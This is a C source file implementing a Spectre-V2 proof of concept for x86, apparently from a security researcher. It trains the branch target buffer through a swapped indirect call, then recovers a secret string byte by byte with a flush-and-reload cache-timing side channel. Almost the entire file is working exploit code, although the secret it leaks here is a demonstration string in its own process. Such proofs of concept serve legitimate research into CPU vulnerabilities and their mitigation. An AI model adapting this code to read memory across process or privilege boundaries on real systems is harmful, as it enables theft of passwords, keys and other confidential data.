/*************************
 * Description: A PoC to confirm Spectre-V2 on x86
 *
 * Author: hujinwei@iie.ac.cn
 * *************************/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include "../tools/tools.h"

#define STRIDE                  4096

#define TARGET_CPU              1

/********************************************************************
 Global Variables and Victim Code
********************************************************************/
__attribute__((aligned(4096))) static volatile void *target_func = NULL;
__attribute__((aligned(4096))) volatile uint64_t level1;
__attribute__((aligned(4096))) volatile uint64_t level2;
__attribute__((aligned(4096))) volatile uint64_t level3;
__attribute__((aligned(4096))) volatile uint64_t level4;

const char *secret = "Spectre V2 PoC Success!";
uint32_t finished_one = 0;

uint8_t *array = NULL;
volatile uint8_t temp = 0;

int victim_function(char *secret_ptr) {
    return array[*secret_ptr * STRIDE];
}

int safe_function(char *secret_ptr) {
    return 0;
}

void train(void *secret_ptr) {
    CLFLUSH(target_func);
    
    CLFLUSH(&level1);
    CLFLUSH(&level2);
    CLFLUSH(&level3);
    CLFLUSH(&level4);

    level3 = level4;
    level2 = level3;
    level1 = level2;


    ((void (*)(const char *))target_func)((const char *)secret_ptr);
}


/********************************************************************
 Attack Logic and Main Function
********************************************************************/
int recover_secret_byte(void* secret_ptr, uint64_t threshold) {
    int results[256] = {0};

    for (int tries = 999; tries > 0; tries--) {
        target_func = (void *)victim_function;
        MFENCE;
        for (int i = 0; i < 50; i++) {              // 毒化BTB
            train(secret_ptr);
        }

        for (int i = 0; i < 256; i++) flush_addr(&array[i * STRIDE]);       // 排除干扰
        MFENCE;

        target_func = (void *)safe_function;
        CLFLUSH(target_func);
        MFENCE;
        train(secret_ptr);

        for (int off = 0; off < 2; off++) {              // 0 或 2048
            for (int page = 0; page < 128; page++) {
                int i = page * 2 + off;                    // 第 page 页的第 off 桶
                if (time_access(&array[i * STRIDE]) < threshold) results[i]++;
            }
        }
    }

    int max = -1, best = -1;
    for (int i = 0; i < 256; i++) {
        if (i < 16) continue;
        if (results[i] > max) { max = results[i]; best = i; }
    }

    if (results[best] > 0) finished_one = 1;
    else finished_one = 0;

//    printf("\nbest = %d, times = %d\n", best, results[best]);
    return best;
}


int main() {


    array = mmap(NULL, 256 * STRIDE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (array == MAP_FAILED) {
        printf("Error, cannot allocate memory.\n");
        return -1;
    }

    // 1. 设置环境


    // 2. 校准阈值
    uint64_t threshold = measure_access_time();

    // 3. 执行 Spectre V2 攻击
    memset(array, 1, 256 * STRIDE);
    size_t secret_len = strlen(secret);
    char recovered_string[secret_len + 1];
    memset(recovered_string, 0, sizeof(recovered_string));

    printf("[*] Leaking secret: \"%s\"\n", secret);
    printf("[*] Starting attack...\n\n");
    fflush(stdout);
    
    for (int i = 0; i < secret_len; i++) {
        int recovered_byte = recover_secret_byte((void *)&secret[i], threshold);
        if (!finished_one) {
            i--;
            continue;
        }
        recovered_string[i] = (recovered_byte > 31 && recovered_byte < 127) ? (char)recovered_byte : '?';
        printf("\rLeaked: %s", recovered_string);
        fflush(stdout);
    }
    
    printf("\n\n[*] Attack finished.\n\n");


    return 0;
}

